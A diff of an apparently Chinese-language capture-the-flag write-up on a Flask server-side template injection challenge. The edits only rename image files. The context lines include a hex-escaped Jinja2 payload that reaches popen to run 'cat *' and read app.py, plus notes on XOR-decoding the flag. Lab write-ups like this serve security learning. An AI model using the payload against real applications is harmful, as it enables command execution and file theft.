@@ -10,11 +10,11 @@
 
 找到个输入框，随便输入什么都返回同样的字符串，因为是`SSTI`的题目，使用`SSTI`的`payload`
 
-![](img/Flask SSTI-2.png)
+![](img/FlaskSSTI-2.png)
 
 发现输入框处存在`SSTI`，看一下配置信息，发现了`flag`
 
-![](img/Flask SSTI-3.png)
+![](img/FlaskSSTI-3.png)
 
 但是似乎是被加密的，要解密需要进一步读取`app.py`文件，尝试各种绕过之后发现可以`hex`绕过
 
@@ -22,7 +22,7 @@
 {{""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbases\x5f\x5f"][0]["\x5f\x5fsubclasses\x5f\x5f"]()[117]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"]("cat *")["read"]()}}
 ```
 
-![](img/Flask SSTI-4.png)
+![](img/FlaskSSTI-4.png)
 
 用了`异或`进行加密，在逆向比较常见，利用`异或`的特性，即异或某字符两字即为原字符
 
@@ -58,4 +58,4 @@ if __name__ == '__main__':
     decode(encoded, key, key2)
 ```
 
-![](img/Flask SSTI-5.png)
+![](img/FlaskSSTI-5.png)
